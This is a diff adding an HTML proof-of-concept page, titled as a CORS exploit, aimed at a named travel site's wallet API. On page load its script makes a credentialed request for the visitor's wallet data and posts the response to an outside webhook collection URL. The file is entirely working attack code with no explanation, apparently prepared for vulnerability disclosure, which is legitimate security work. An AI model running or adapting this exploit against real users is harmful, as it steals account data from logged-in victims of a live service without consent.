@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PoC Exploit</title>
+</head>
+<body>
+<script>
+fetch('https://mapi.makemytrip.com/empeiria/api/v1/walletmanager?brand=mmt&profile=b2c&device=dt&version=NT%2010.0&region=in&currency=inr&user-currency=USD&language=eng', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        userEvent: {
+            showWallet: true,
+            currentPage: "HOTELS"
+        }
+    })
+})
+.then(response => response.json())
+.then(data => {
+    fetch('https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    });
+})
+.catch(error => console.error('Error:', error));
+</script>
+</body>
+</html>
